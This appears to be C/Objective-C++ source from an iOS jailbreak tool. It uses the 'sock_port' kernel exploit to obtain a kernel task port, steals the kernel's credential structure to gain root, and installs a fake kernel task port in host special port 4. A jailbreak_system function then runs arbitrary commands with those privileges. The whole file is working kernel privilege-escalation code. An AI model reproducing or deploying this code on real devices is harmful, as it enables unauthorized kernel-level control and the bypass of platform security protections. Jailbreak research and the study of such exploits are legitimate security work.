extern "C" mach_port_t sock_port_get_tfp0(kptr_t *kbase, offsets_t *off);

extern "C" int jailbreak_system(const char *command) {
    return _jailbreak_with_cb([=](task_t tfp0_, kptr_t kbase, void *data) {
        resume_all_threads();
        pthread_yield_np();
        dsystem(command);
        return KERN_SUCCESS;
    });
}

static kern_return_t sock_port(offsets_t *off, jailbreak_cb_t callback, void *cb_data) {
    
    mach_port_t tfp0 = sock_port_get_tfp0(&kbase, off);
    if (tfp0 == MACH_PORT_NULL) {
        return -1;
    }
    LOG("done sock port!\n");
    ::tfp0 = tfp0;
    
    LOG("Initing patchfinder\n");
    int ret1 = init_kernel(kread, kbase, NULL);
    if (ret1) {
        postProgress(@"patchfinder64 failed");
        return -1;
    }
    
    kptr_t kernel_task_addr;
    kread(kbase + off->kernel_task - off->base, &kernel_task_addr, sizeof(kernel_task_addr));
    kptr_t kernel_bsd_info;
    kread(kernel_task_addr + off->task_bsd_info, &kernel_bsd_info, sizeof(kernel_bsd_info));
    kptr_t kernel_ucred;
    kread(kernel_bsd_info + off->proc_ucred, &kernel_ucred, sizeof(kernel_ucred));
    
    if (proc_struct_addr() == 0) {
        LOG("Failed get self proc struct addr");
        return -1;
    }

    kptr_t self_ucred;
    kread(proc_struct_addr() + off->proc_ucred, &self_ucred, sizeof(self_ucred));
    
    kwrite(proc_struct_addr() + off->proc_ucred, &kernel_ucred, sizeof(kernel_ucred));
    uid_t old_uid = getuid();
    if (setuid(0)) {
        printf("Failed steal kernel ucred\n");
        return -1;
    }
    LOG("done setuid0!");
    callback(tfp0, kbase, cb_data);
    kwrite(proc_struct_addr() + off->proc_ucred, &self_ucred, sizeof(self_ucred));
    
    setuid(old_uid);
    return 0;
}


static bool
set_hgsp4(task_t tfp0, task_t port, kptr_t kbase) {
    offsets_t *off = _off;
    kern_return_t kr = KERN_FAILURE;
    bool ret = false;
    host_t host = HOST_NULL;
    host = mach_host_self();
    kptr_t kernel_task_addr = 0;
    size_t const sizeof_task = 0x1000;
    kread(kbase + off->kernel_task - off->base, &kernel_task_addr, sizeof(kernel_task_addr));
    if (kernel_task_addr == 0) {
        return false;
    }
    task_t zm_fake_task_port = TASK_NULL;
    task_t km_fake_task_port = TASK_NULL;
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &zm_fake_task_port);
    if (kr != KERN_SUCCESS) {
        return false;
    }
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &km_fake_task_port);
    if (kr != KERN_SUCCESS) {
        return false;
    }
    kptr_t zone_map = 0;
    kread(kbase + off->zone_map - off->base, &zone_map, sizeof(zone_map));
    if (zone_map == 0) {
        return false;
    }
    kptr_t kernel_map = kread_uint64(kernel_task_addr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
    if (!KERN_POINTER_VALID(kernel_map)) {
        return false;
    }
    
    kptr_t zm_fake_task_addr = make_fake_task(zone_map);
    if (!KERN_POINTER_VALID(zm_fake_task_addr)) {
        return false;
    }
    kptr_t km_fake_task_addr = make_fake_task(kernel_map);
    if (!KERN_POINTER_VALID(km_fake_task_addr)) {
        return false;
    }
    
    if (!make_port_fake_task_port(zm_fake_task_port, zm_fake_task_addr)) {
        return false;
    }
    
    if (!make_port_fake_task_port(km_fake_task_port, km_fake_task_addr)) {
        return false;
    }
    
    km_fake_task_port = zm_fake_task_port;
    vm_prot_t cur = VM_PROT_NONE, max = VM_PROT_NONE;
    kptr_t remapped_task_addr = 0;
    
    kr = mach_vm_remap(km_fake_task_port, &remapped_task_addr, sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, zm_fake_task_port, kernel_task_addr, 0, &cur, &max, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
        return false;
    }
    if (remapped_task_addr == kernel_task_addr) {
        return false;
    }
    kr = mach_vm_wire(host, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE);
    if (kr != KERN_SUCCESS) {
        printf("Unable to wire kernel memory %s\n", mach_error_string(kr));
        return false;
    }
    kptr_t const port_addr = get_address_of_port(proc_struct_addr(), port);
    if(!KERN_POINTER_VALID(port_addr)) {
        return false;
    }
    if (!make_port_fake_task_port(port, remapped_task_addr)) {
        return false;
    }
    if(kread_uint64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != remapped_task_addr) {
        return false;
    }
    kptr_t const host_priv_addr = get_address_of_port(proc_struct_addr(), host);
    if(!KERN_POINTER_VALID(host_priv_addr)) {
        return false;
    }
    kptr_t const realhost_addr = kread_uint64(host_priv_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    if (!KERN_POINTER_VALID(realhost_addr)) {
        return false;
    }
    int const slot = 4;
    if (!kwrite_uint64(realhost_addr + koffset(KSTRUCT_OFFSET_HOST_SPECIAL) + slot * sizeof(kptr_t), port_addr)) {
        return false;
    }
    ret = true;
out:
    
    if (MACH_PORT_VALID(host)) mach_port_deallocate(mach_task_self(), host); host = HOST_NULL;
    
    return true;
}

extern "C" uint64_t find_zone_map_ref(void);

#define kCFCoreFoundationVersionNumber_iOS_11_0 1443.00
extern "C" size_t get_zone_map_ref(void) {
    static kptr_t addr = 0;
    if (addr == 0) {
        //patchfinder64 do not support ios10
        if (kCFCoreFoundationVersionNumber >= kCFCoreFoundationVersionNumber_iOS_11_0) {
            addr = find_zone_map_ref();
        } else {
            addr = kbase + _off->zone_map - _off->base;
        }
    }
    return addr;
}
